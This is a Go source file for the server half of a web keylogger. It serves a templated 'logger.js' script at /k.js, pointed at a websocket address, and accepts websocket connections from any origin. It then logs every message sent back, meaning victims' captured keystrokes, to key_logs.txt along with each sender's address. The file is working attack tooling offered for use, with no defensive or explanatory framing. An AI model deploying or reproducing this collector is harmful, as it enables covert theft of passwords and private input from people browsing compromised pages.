package main

import (
	//inner dependency
	"flag"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"

	//outer dependency
	"github.com/gorilla/websocket"
)

var (
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}

	listenAddr string
	wsAddr     string
	jsTemplate *template.Template
)

func init() {
	flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
	flag.StringVar(&wsAddr, "ws-addr", "", "Address for WS connection")
	flag.Parse()

	fh, fileErr := os.OpenFile("key_logs.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)

	if fileErr != nil {
		panic(fileErr)
	}
	log.SetOutput(fh)

	var err error

	jsTemplate, err = template.ParseFiles("logger.js")
	if err != nil {
		panic(err)
	}
}

func serveWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)

	if err != nil {
		http.Error(w, "Some Fuck-Up Occured", 500)
		log.Printf("error occured %v", err)
		fmt.Printf("error occured %v", err)
		return
	}

	defer conn.Close()
	log.Printf("Connection from %s\n", conn.RemoteAddr().String())
	fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Printf("error while reading message: %v", err)
			fmt.Printf("error while reading message: %v", err)
			return
		}
		log.Printf("From %s: %v\n", conn.RemoteAddr().String(), string(msg))
		fmt.Printf("From %s: %v\n", conn.RemoteAddr().String(), string(msg))
	}
}

func serveFile(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript")
	jsTemplate.Execute(w, wsAddr)
}

func main() {
	r := http.NewServeMux()
	r.HandleFunc("/ws", serveWS)
	r.HandleFunc("/k.js", serveFile)
	r.Handle("/", http.FileServer(http.Dir(".")))
	log.Fatalln(http.ListenAndServe(":8080", r))
}
